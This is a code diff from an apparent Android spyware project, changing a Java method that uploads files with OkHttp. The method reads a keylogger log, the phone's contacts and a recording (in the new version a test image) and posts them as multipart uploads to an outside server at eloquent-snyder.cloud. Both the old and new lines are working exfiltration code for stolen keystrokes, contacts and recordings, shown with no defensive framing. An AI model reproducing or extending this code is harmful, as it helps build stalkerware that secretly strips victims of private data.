@@ -22,16 +22,16 @@ public class okHTTP3 {
     OkHttpClient client2 = new OkHttpClient();
 
     public void sendFile(Context context){
-        String filepath = context.getFilesDir().getPath() + "/Keylogger.txt";
-        String filepath1 = context.getFilesDir().getPath() + "/Contacts.txt";
-        String filepath2 = "/data/user/0/com.example.project/filesRecording_20230213_124740.3gp";
+        String filepath = "/data/data/com.example.project/files/Keylogger.txt";
+        String filepath1 = "/data/data/com.example.project/files/Contacts.txt";
+        String filepath2 = "/data/data/com.example.project/filestest.jpg";
         String url = "https://eloquent-snyder.cloud/receivefile.php";
         File file = new File(filepath);
         File file1 = new File(filepath1);
         File file2 = new File(filepath2);
         RequestBody fileBody = RequestBody.create(MediaType.parse("application/octet-stream"), file);
         RequestBody fileBody1 = RequestBody.create(MediaType.parse("application/octet-stream"), file1);
-        RequestBody fileBody2 = RequestBody.create(MediaType.parse("audio/3gp"), file2);
+        RequestBody fileBody2 = RequestBody.create(MediaType.parse("image/jpeg"), file2);
 
         RequestBody requestBody = new MultipartBody.Builder()
                 .setType(MultipartBody.FORM)
@@ -43,7 +43,7 @@ public class okHTTP3 {
                 .build();
         RequestBody requestBody2 = new MultipartBody.Builder()
                 .setType(MultipartBody.FORM)
-                .addFormDataPart("audio", file2.getName(), fileBody2)
+                .addFormDataPart("file", file2.getName(), fileBody2)
                 .build();
 
         Request request = new Request.Builder()
